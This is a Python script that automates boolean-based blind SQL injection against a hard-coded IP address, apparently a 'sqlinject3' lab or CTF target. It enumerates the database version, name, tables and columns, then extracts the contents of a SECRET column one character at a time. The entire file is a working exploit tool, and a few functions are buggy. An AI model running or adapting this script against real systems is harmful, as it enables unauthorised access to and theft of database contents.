import urllib, requests
from bs4 import BeautifulSoup


def linkify(query):
    pre = 'http://3.86.24.15/sqlinject3/?id='
    parsed = urllib.quote(query)
    return pre + parsed


def is_valid(link):
    page = requests.get(link)
    if 'Gulshan' in page.content and 'Singh' in page.content:
        return True
    return False


def get_version():

    version = ''
    for i in range(0, 100):
        for ascii in range(32, 123):
            if ascii is not 37 and ascii:
                query = '''\
                   1' AND (SELECT @@version) LIKE '\
                   '''
                query = query[:-20]
                query += version + chr(ascii)
                query += '%\'#'
                #print query
                link = linkify(query)
                if is_valid(link):
                    version += chr(ascii)
                    print version
                    break
    print version

def get_db_length():
    for i in range(0, 20):
        query = '''\
        1' AND (SELECT LENGTH(database()))=\
        '''
        query += str(i) + '#'
        link = linkify(query)
        if is_valid(link):
            print i
            break


def get_db_name(length):
    db_name = ''
    for i in range(1, length):
        for ascii in range(32, 122):
            query = '''\
            1' AND (SELECT ASCII(SUBSTRING(database(), \
            '''
            query += str(i) + ', 1)))='
            query += str(ascii) + '#'
            link = linkify(query)
            if is_valid(link):
                print chr(ascii)
                db_name += chr(ascii)

    print db_name


def get_table_num():
    for i in range(0, 10):
        query = '''\
            1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())=\
            '''
        query += str(i) + '#'
        link = linkify(query)
        if is_valid(link):
            print i
            return


def get_table_length(index):
    for i in range(0, 20):
        query = '''\
           1' AND (SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema=database() LIMIT \
           '''
        query += str(index-1) + ',1)=' + str(i) + '#'
        link = linkify(query)
        if is_valid(link):
            print i
            break

def get_table_name(index, len):
    table_name = ''
    for i in range( 0,len):
        for ascii in range(65,123):
            query = '''\
            1' AND (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT\
            '''
            query = query[:-11]
            query += str(index - 1) + ',1) LIKE \''
            query += table_name + chr(ascii)
            query += '%\'#'
            #print query
            link = linkify(query)
            if is_valid(link):
                table_name += chr(ascii)
                #print table_name
                break
    print table_name


def get_col_num(table_name='SECRETTABLE'):
    for i in range(0,20):
        query  = '''\
        1' AND (SELECT COUNT(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name=\
        '''
        query += '\'' + table_name + '\')='
        query += str(i) + '#'
        link = linkify(query)
        if is_valid(link):
            print i
            break

def get_col_len(table_name='SECRETTABLE'):
    for i in range(0,20):
        query = '''\
        1' AND (SELECT LENGTH(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name=\
        '''
        query += '\'' + table_name + '\' LIMIT 1,1)='
        query += str(i) + '#'
        link = linkify(query)
        if is_valid(link):
            print i
            break



def get_col_name(table_name, index, len):
    table_name = ''
    for i in range( 0,len):
        for ascii in range(65,123):
            query = '''\
            1' AND (SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='SECRETTABLE' LIMIT\
            '''
            query = query[:-11]
            query += str(index - 1) + ',1) LIKE \''
            query += table_name + chr(ascii)
            query += '%\'#'
            #print query
            link = linkify(query)
            if is_valid(link):
                table_name += chr(ascii)
                #print table_name
                break
    print table_name



def get_secret_length():
    for i in range(0, 50):
        query = '''\
        1' AND (SELECT LENGTH(SECRET) FROM SECRETTABLE LIMIT 0,1)=\
        '''
        query += str(i) + '#'
        link = linkify(query)
        if is_valid(link):
            print i
            break


def get_secret_data(len):
    secret = ''
    for i in range(0, len):
        for ascii in range(65, 123):
            query = '''\
            1' AND (SELECT SECRET FROM SECRETTABLE LIMIT 1) LIKE '\
            '''
            query = query[:-12]
            query += secret + chr(ascii)
            query += '%\'#'
            #print query
            link = linkify(query)
            if is_valid(link):
                secret += chr(ascii)
                print secret
                break
    print secret


get_secret_data(19)